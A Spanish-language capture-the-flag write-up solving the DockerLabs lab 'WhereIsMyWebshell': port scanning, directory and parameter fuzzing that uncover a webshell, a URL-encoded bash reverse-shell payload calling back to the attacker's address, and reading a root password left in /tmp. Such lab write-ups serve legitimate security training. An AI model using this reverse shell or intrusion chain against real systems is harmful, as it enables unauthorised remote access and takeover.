#MAQUINA #DOCKERLABS #FACIL
<hr>

# RECONOCIMIENTO

Vamos a resolver **WhereIsMyWebshell** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 11:46 CET
Initiating ARP Ping Scan at 11:46
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:46, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:46
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:46, 0.50s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-09 11:46:34 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.71 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 11:46 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.50 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 11:49 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)
Al revisar la web que hay en el puerto 80, vemos que nos dice que guarda un secreto en **/tmp**.

Usando **gobuster** encontramos lo siguiente:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,jpg,html,php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2510]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================



```

Hay un **shell.php** , archivo raro. Vamos a usar **wfuzz** para ver si tiene algún parámetro :
   ```bash
wfuzz -u "http://172.17.0.2/shell.php?FUZZ=whoami" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --hc=500
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/shell.php?FUZZ=whoami
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                              
=====================================================================

000108069:   200        2 L      2 W        21 Ch       "parameter" 

```

Podemos ejecutar comandos desde **shell.php** con **parameter**.

# EXPLOTACION

Nos ponemos en escucha por el puerto 443 y :

   ```bash
   
http://172.17.0.2/shell.php?parameter=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/172.17.0.1/443%20%3C%261%20%27

```

# ESCALADA PRIVILEGIOS

Recordamos que había algo en **/tmp**:

   ```bash
www-data@e486af8c2078:/var/www/html$ cd /tmp
www-data@e486af8c2078:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root 4096 Dec  9 10:44 .
drwxr-xr-x 1 root root 4096 Dec  9 10:44 ..
-rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
www-data@e486af8c2078:/tmp$ cat .secret.txt 
contraseñaderoot123


```

Tenemos la contra de root.

**YA ESTAMOS COMO ROOT.**